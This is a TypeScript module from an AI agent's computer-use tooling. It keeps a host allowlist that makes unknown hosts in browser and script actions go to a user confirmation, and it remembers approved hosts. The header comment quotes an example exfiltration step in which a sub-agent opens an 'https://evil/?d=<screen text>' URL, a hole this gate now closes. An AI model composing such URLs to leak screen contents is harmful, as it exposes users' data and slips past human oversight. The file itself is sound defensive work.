import { mkdirSync, readFileSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { config } from '../config.ts';

/**
 * M7 host allowlist — one list for both computer-use surfaces, mirroring the M4.1 egress
 * proxy's posture (known hosts flow freely, unknown ones escalate to a notch confirm,
 * never a silent block):
 *   1. the browser lane: browser_navigate targets + the page a browser_act runs on;
 *   2. the script lanes: gateScript's literal-URL gate, which CLOSES the exfil residual
 *      recorded in policy.ts (a sub-agent composing `open location "https://evil/?d=
 *      <screen text>"` used to auto-run — now the unknown host confirms).
 * Base entries come from config.browser.allowedHosts; per-confirm "remember" approvals
 * persist in ~/Gumbo/browser/hosts.json (secret-adjacent state, never /files-served).
 */

// In-memory cache of the remembered file. Tests run one file per process (node --test
// isolation), so module state is safe — same memoization idiom as audit.ts.
let remembered: Set<string> | null = null;

function hostsFile(): string {
  return join(config.home.browser, 'hosts.json');
}

function load(): Set<string> {
  if (remembered) return remembered;
  try {
    const raw: unknown = JSON.parse(readFileSync(hostsFile(), 'utf8'));
    remembered = new Set(Array.isArray(raw) ? raw.filter((h): h is string => typeof h === 'string').map(normalizeHost) : []);
  } catch {
    remembered = new Set(); // missing or corrupt file → empty; the confirm flow is the fail-safe
  }
  return remembered;
}

function normalizeHost(host: string): string {
  return host.toLowerCase().replace(/\.$/, '');
}

/** Hostname of a URL, or null when it can't be parsed (callers treat null as "not a web
 *  URL" — e.g. about:blank — never as approved-by-accident for a real fetch target). */
export function hostOf(url: string): string | null {
  try {
    const host = new URL(url).hostname;
    return host ? normalizeHost(host) : null;
  } catch {
    return null;
  }
}

/** True when the URL's host is the user-approved: an exact entry or a subdomain of one
 *  (bare domains match subdomains, like sandbox.allowedDomains). */
export function hostAllowed(url: string): boolean {
  const host = hostOf(url);
  if (!host) return false;
  const entries = [...config.browser.allowedHosts.map(normalizeHost), ...load()];
  return entries.some((entry) => host === entry || host.endsWith('.' + entry));
}

/** Persist a host the user approved with "remember" — write-through so the next task (and
 *  the script lanes) skip the confirm. */
export function rememberHost(host: string) {
  const set = load();
  set.add(normalizeHost(host));
  mkdirSync(config.home.browser, { recursive: true });
  writeFileSync(hostsFile(), JSON.stringify([...set].sort(), null, 2) + '\n');
}
